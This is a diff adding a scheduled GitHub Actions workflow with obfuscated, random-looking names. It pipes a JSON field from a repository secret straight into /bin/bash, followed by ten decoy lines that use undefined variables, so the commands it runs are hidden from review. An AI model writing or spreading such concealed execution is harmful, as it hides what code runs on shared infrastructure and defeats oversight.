@@ -1,0 +1,29 @@
+name: zongjiangmingliang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zongjiangmingliang
+        env:
+          jqp647: ${{ secrets.jqp647 }}
+        run: |
+          echo $jqp647 | jq -r .nb21 | /bin/bash
+          echo $nuh1163 | jq -r .nsiry2469 | /bin/bash
+          echo $ihle5 | jq -r .gucc28 | /bin/bash
+          echo $zudj10 | jq -r .dhuyh63139 | /bin/bash
+          echo $kvbwi8 | jq -r .blnk7 | /bin/bash
+          echo $tlx568 | jq -r .v25 | /bin/bash
+          echo $ajdqr0278 | jq -r .tcroo5 | /bin/bash
+          echo $aj9 | jq -r .oqk2 | /bin/bash
+          echo $hrst5 | jq -r .snxwv18423 | /bin/bash
+          echo $dnzot69257 | jq -r .wbmp024 | /bin/bash
+          echo $bkmib19 | jq -r .ap0 | /bin/bash
+
